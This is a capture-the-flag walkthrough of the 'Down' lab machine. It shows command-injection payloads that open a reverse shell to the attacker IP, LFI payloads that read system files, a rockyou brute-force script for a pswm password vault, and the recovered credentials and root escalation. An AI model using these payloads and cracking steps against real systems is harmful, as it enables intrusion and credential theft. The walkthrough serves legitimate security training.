# Down - Easy

```sh
sudo vim /etc/hosts
# add down.htb

nmap -T4 -p- -A -Pn -v down.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.11
    * 80/tcp - http - Apache httpd 2.4.52

* the website is a page for checking if a particular website is down or not - it has an input field that takes a URL to be checked

* we can use Burp Suite to intercept and test the requests for any injection attacks

* the website uses a POST request to '/index.php' with the data having a 'url' parameter, with the submitted website link; and after a while we get the response that shows if the website is up or not

* we can test the logic of the webpage by entering URLs pointing to the attacker IP - like 'http://10.10.14.95:8000', where port 8000 is hosting the Python server - and this works

* similarly, if we check the localhost URLs - like 'http://localhost' or 'http://127.0.0.1' - it works, and the website says that the webpage is up, and prints the source code as well

* we can use this firstly to check for any internal services or webpages, that otherwise cannot be accessed from an external machine

* we can use ```ffuf``` to fuzz for all ports to check this:

    ```sh
    for i in {1..65535};do echo $i >> ports.txt;done
    # create list of ports

    ffuf -u 'http://down.htb/index.php' -w ports.txt -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'url=http://localhost:FUZZ' -ac
    # the header is used as it was seen in the request in Burp Suite
    # -ac for auto filtering in ffuf
    ```

* the ```ffuf``` command auto-filters responses for ports 80 only; which means we need to check for other approaches to exploit this URL field

* web enumeration:

    ```sh
    gobuster dir -u http://down.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md,js -t 25
    # dir scan

    ffuf -c -u 'http://down.htb' -H 'Host: FUZZ.down.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 131 -s
    # subdomain scan
    ```

* if we use a URL like ```file:///etc/passwd```, we get an error saying 'only protocols http or https allowed'

* before attempting fuzzing, we can check more about the request by entering an URL pointing to the attacker server, and sniffing the packets in ```wireshark``` - this might give us some info about the requests made

* we can start the capture by running ```sudo wireshark``` to launch the GUI, and start sniffing on 'tun0' interface

* then, start a Python server using ```python3 -m http.server```, and issue a POST request to the URL 'http://10.10.14.95:8000' as usual

* from the captured packets, we can see that one of the packets includes a GET request to our machine; the 'User-Agent' header has the value 'curl/7.81.0'

* this indicates that the target webapp is using ```curl``` to check if a website is alive or not; it is likely running a ```curl``` command in the backend

* Googling for exploits associated with 'curl 7.81.0' does not give anything - we may need to test for injection attacks now

* we can test for command injection attacks manually first - we can use the following operators (and their URL-encoded forms) to check, with the data format as 'http://10.10.14.95:8000FUZZ', where 'FUZZ' marks the injection point:

    * ```;``` (%3b)
    * ```\n``` (%0a)
    * ```&``` (%26)
    * ```|``` (%7c)
    * ```&&``` (%26%26)
    * ```||``` (%7c%7c)
    * `` (%60%60)
    * ```$()``` (%24%28%29)
    * ```%09``` (tabs)

* for most of the injection attempts, the website reports the attacker server is down; however, for the following operators, the website reports the attacker server is up, which means the ```curl``` command did run:

    * ```%0a```
    * ```&```
    * ```&&```
    * ```%09```

* we can build on this by testing for command injection and RCE in Burp Suite Repeater:

    * for each injected character, we can try checking for RCE using operators like ```$()```, ``, and ```${}```

    * for testing, we can use the command ```ping -c 3 10.10.14.95``` in URL-encoded form, and combine with the above operators to check if the command gets executed at any point - we can setup a listener using ```sudo tcpdump -i tun0 icmp```

    * the RCE attempts do not work as the listener does not get any ICMP packets

    * as RCE does not seem to work, we can test for LFI as well

    * since the ```file``` protocol was not allowed by the webpage normally, we can try using it with the above injected characters

    * if we use the ```file``` protocol with the tab (```%09```) character, we can see LFI works; for example, the payload ```url=http://10.10.14.95:8000%09file:///etc/passwd``` prints the ```/etc/passwd``` file in the output

* as LFI is confirmed, we can use it to enumerate the system, using the following payloads:

    * ```url=http://10.10.14.95%09file:///etc/passwd``` - ```/etc/passwd``` shows that there is a user 'aleks' on the box
    
    * ```url=http://10.10.14.95%09file:///etc/hosts``` - ```/etc/hosts``` does not give any useful info

    * ```url=http://10.10.14.95%09file:///proc/self/environ``` - env variables do not give any secrets, but shows that the working dir is ```/var/www/html```, and Apache dirs are ```/var/run/apache2``` & ```/var/log/apache2```

    * ```url=http://10.10.14.95%09file:///var/www/html/index.php``` - prints the code for 'index.php'

* the webpage source code is obtained from LFI - this shows the PHP code snippet containing the logic:

    ```php
    if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {
    $ip = trim($_POST['ip']);
    $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
    $port = trim($_POST['port']);
    $port_int = intval($port);
    $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
    if ( $valid_ip && $valid_port ) {
        $rc = 255; $output = '';
        $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
        exec($ec . " 2>&1",$output,$rc);
        echo '<div class="output" id="outputSection">';
        if ( $rc === 0 ) {
        echo "<font size=+1>It is up. It's just you! 😝</font><br><br>";
        echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
        } else {
        echo "<font size=+1>It is down for everyone! 😔</font><br><br>";
        echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
        }
    } else {
        echo '<div class="output" id="outputSection">';
        echo '<font color=red size=+1>Please specify a correct IP and a port between 1 and 65535.</font>';
    }
    } elseif (isset($_POST['url'])) {
    $url = trim($_POST['url']);
    if ( preg_match('|^https?://|',$url) ) {
        $rc = 255; $output = '';
        $ec = escapeshellcmd("/usr/bin/curl -s $url");
        exec($ec . " 2>&1",$output,$rc);
        echo '<div class="output" id="outputSection">';
        if ( $rc === 0 ) {
        echo "<font size=+1>It is up. It's just you! 😝</font><br><br>";
        echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
        } else {
        echo "<font size=+1>It is down for everyone! 😔</font><br><br>";
        }
    } else {
        echo '<div class="output" id="outputSection">';
        echo '<font color=red size=+1>Only protocols http or https allowed.</font>';
    }
    }
    ```

    * besides the normal mode of the website which uses ```curl``` to check http/https links, there is an 'expert' mode which uses ```nc``` to check connectivity

    * the 'expert' mode needs the query parameter 'expertmode' set to 'tcp', and needs data args 'ip' and 'port'

    * then, it validates the data to check if IP & port values are valid, and prepares a ```nc``` command

    * the ```nc``` command is in the format ```/usr/bin/nc -vz <ip> <port>```, and checks if the connection is up

* we can use the 'expert' mode now:

    * setup listener using ```nc -nvlp 4444```

    * navigate to the URL 'http://down.htb/index.php?expertmode=tcp' - this leads to a form with IP and port number fields

    * enter the attacker IP and port 4444 and submit

    * the connection works but it is transient as ```nc``` is using the ```-z``` flag, used for scan mode and not connect mode

* from the code segment, we can see that the IP value is validated, but the port value is not validated - this means it is possible to inject values in the port field

* for ```nc```, while ```-z``` is used for scan mode, we can try to inject other supported flags like ```-c```, which can be used to execute a specified command after connection - we can test this:

    * setup a listener for pings using ```sudo tcpdump -i tun0 icmp```, and a listener for 

    * intercept a valid request to the 'expertmode' page using Burp Suite and send to Repeater

    * in the data field, for the port value, we can try injecting the commands for the ```-c``` flag - we need to URL encode the data:

        ```sh
        ip=10.10.14.95&port=4444+-c+'ping+-c+3+10.10.14.95'
        ```
    
    * if we issue the POST request using the above data, we can see the pings hitting our listener, and the commands are executed before the transient connection is terminated

* as RCE is confirmed, we can use this to get reverse shell now:

    * setup first listener for the transient connection - ```nc -nvlp 4444``` - and another listener for revshell - ```nc -nvlp 4445```

    * use one of the revshell one-liners as the payload to be executed - in this case we can use ```busybox nc 10.10.14.95 4445 -e sh```
    
    * inject it in the port field value in URL-encoded form and issue the POST request:

        ```sh
        ip=10.10.14.95&port=4444+-c+'busybox+nc+10.10.14.95+4445+-e+sh'
        ```
    
    * this works and we get reverse shell on our listener

* in reverse shell:

    ```sh
    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # press Enter twice

    ls -la
    # in '/var/www/html'

    cat user_aeT1xa.txt
    # user flag

    ls -la /

    ls -la /home
    # 'aleks' user

    ls -la /home/aleks
    # limited read access
    # we can check all files

    ls -la /home/aleks/.local

    ls -la /home/aleks/.local/share
    # contains a non-default folder 'pswm'

    ls -la /home/aleks/.local/share/pswm
    # contains a file with the same name

    cat /home/aleks/.local/share/pswm/pswm
    ```

* the 'pswm' file contains an encrypted text blob:

    ```sh
    e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
    ```

* Googling for 'pswm' leads to a [password manager utility](https://github.com/Julynx/pswm) - it has a set of commands as well to check stored creds

* we can check if ```pswm``` works on the target:

    ```sh
    which pswm
    # it is already installed at /usr/bin/pswm

    pswm -a
    # command to check all users & passwords
    # this fails
    ```

* ```pswm -a``` fails as the utility checks for the 'vault file' at ```/var/www/.local``` - this path is meant to have the file for current user, but we do not have any file here

* however, as we have the original file from ```/home/aleks/.local/share/pswm/pswm```, we can create the same path here to use ```pswm``` and get the stored data:

    ```sh
    cd /var/www

    mkdir .local
    # permission denied
    ```

* while we cannot create the required ```.local``` path on the target, we can create this on attacker machine by installing the tool:

    ```sh
    # on attacker

    git clone https://github.com/Julynx/pswm

    cd pswm

    sudo chmod +x pswm

    sudo cp pswm /usr/bin/

    mkdir -p ~/.local/share/pswm
    # create the required folder structure
    # '-p' to create the folders in the path if not created already

    pswm
    # run the utility first to create a master password
    ```

    ```sh
    # on target

    # we can copy the file as it is, to avoid any issues
    cat /home/aleks/.local/share/pswm/pswm | base64 -w 0; echo
    # copy the base64-encoded content
    ```

    ```sh
    # on attacker
    echo -n "<base64-encoded-text>" | base64 -d > ~/.local/share/pswm/pswm
    # decode the base64-encoded content to the file

    pswm -a
    # this is asking for the master password
    ```

* the ```pswm``` tool is asking for the master password - we do not have this, and if we reset this, the config file is overwritten

* at this point, we can try to check how the password vault is created in ```pswm``` by checking the [script code](https://github.com/Julynx/pswm/blob/main/pswm)

* in the script code, we have the exact function 'encrypted_file_to_lines' that opens & decrypts the password vault:

    ```py
    def encrypted_file_to_lines(file_name, master_password):
        """
        This function opens and decrypts the password vault.

        Args:
            file_name (str): The name of the file containing the password vault.
            master_password (str): The master password to use to decrypt the
            password vault.

        Returns:
            list: A list of lines containing the decrypted passwords.
        """
        if not os.path.isfile(file_name):
            return ""

        with open(file_name, 'r') as file:
            encrypted_text = file.read()

        decrypted_text = cryptocode.decrypt(encrypted_text, master_password)
        if decrypted_text is False:
            return False

        decrypted_lines = decrypted_text.splitlines()
        return decrypted_lines
    ```

* it is using the ```decrypt``` function from the ```cryptocode``` module to decrypt the password, using the master password

* while we do not have the master password, we can attempt to bruteforce this by using the 'rockyou.txt' wordlist

* we can create a simple bruteforce script which uses the ```cryptocode``` module:

    ```py
    import cryptocode

    with open('pswm', 'r') as f:
        encrypted_text = f.read()

    # the encoding is required, without it the file cannot be read properly
    with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
        for line in f:
            password = line.strip()
            decrypted_text = cryptocode.decrypt(encrypted_text, password)
            if decrypted_text:
                print(f"Master password: {password}\n")
                print(f"Decrypted text: {decrypted_text}")
                break
    ```

    ```sh
    vim pswmcrack.py

    ls -la
    # ensure the 'pswm' file is present in this folder

    python3 pswmcrack.py
    ```

* the bruteforce script works, and we get the master password 'flower'; the decrypted text gives the creds 'aleks:1uY3w22uc-Wr{xNHR~+E'

* we can now login as 'aleks':

    ```sh
    ssh aleks@down.htb
    # this works

    sudo -l
    # we can run all commands as all users

    sudo su
    # root shell

    cat /root/root.txt
    # root flag
    ```
